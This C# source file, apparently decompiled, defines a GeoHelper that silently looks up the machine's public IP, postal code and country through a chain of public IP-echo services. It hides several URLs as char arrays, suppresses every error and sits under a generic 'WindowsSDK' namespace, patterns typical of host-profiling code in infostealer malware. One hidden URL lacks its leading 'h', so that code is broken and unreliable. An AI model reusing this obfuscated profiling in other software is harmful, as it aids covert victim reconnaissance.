using System;
using System.IO;
using System.Net;
using WindowsSDK.Extensions;
using WindowsSDK.Objects.Serialization;

namespace WindowsSDK.Helpers
{
    public static class GeoHelper
    {
        public static GeoInfo Get()
        {
            GeoInfo geoInfo = new GeoInfo();
            try
            {
                try
                {
                    IpSb ipSb = new WebClient().DownloadString(new string(new char[23]
                    {
                        'h', 't', 't', 'p', 's', ':', '/', '/', 'a', 'p',
                        'i', '.', 'i', 'p', '.', 's', 'b', '/', 'g', 'e',
                        'o', 'i', 'p'
                    })).FromJSON<IpSb>();
                    geoInfo.IP = ipSb.ip;
                    if (geoInfo.IP.Contains(":"))
                    {
                        geoInfo.IP = null;
                    }
                    geoInfo.PostalCode = ipSb.postal_code;
                    geoInfo.Country = ipSb.country_code;
                }
                catch
                {
                }
                try
                {
                    using WebClient webClient = new WebClient();
                    geoInfo.IP = webClient.DownloadString(new string(new char[28]
                    {
                        't', 't', 'p', ':', '/', '/', 'c', 'h', 'e', 'c',
                        'k', 'i', 'p', '.', 'a', 'm', 'a', 'z', 'o', 'n',
                        'a', 'w', 's', '.', 'c', 'o', 'm', '/'
                    })).Trim();
                }
                catch (Exception)
                {
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        geoInfo.IP = new WebClient().DownloadString(new string(new char[20]
                        {
                            'h', 't', 't', 'p', 's', ':', '/', '/', 'i', 'p',
                            'i', 'n', 'f', 'o', '.', 'i', 'o', '/', 'i', 'p'
                        })).Trim('\n').Trim();
                    }
                    catch (Exception)
                    {
                    }
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        geoInfo.IP = new WebClient().DownloadString("https://api.ipify.org").Replace("\n", "");
                    }
                    catch (Exception)
                    {
                    }
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        geoInfo.IP = new WebClient().DownloadString("https://icanhazip.com").Replace("\n", "");
                    }
                    catch (Exception)
                    {
                    }
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        geoInfo.IP = new WebClient().DownloadString("https://wtfismyip.com/text").Replace("\n", "");
                    }
                    catch (Exception)
                    {
                    }
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        geoInfo.IP = new WebClient().DownloadString("http://bot.whatismyipaddress.com/").Replace("\n", "");
                    }
                    catch (Exception)
                    {
                    }
                }
                if (string.IsNullOrEmpty(geoInfo.IP))
                {
                    try
                    {
                        string[] array = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<');
                        geoInfo.IP = array[0];
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch
            {
            }
            return geoInfo;
        }
    }
}
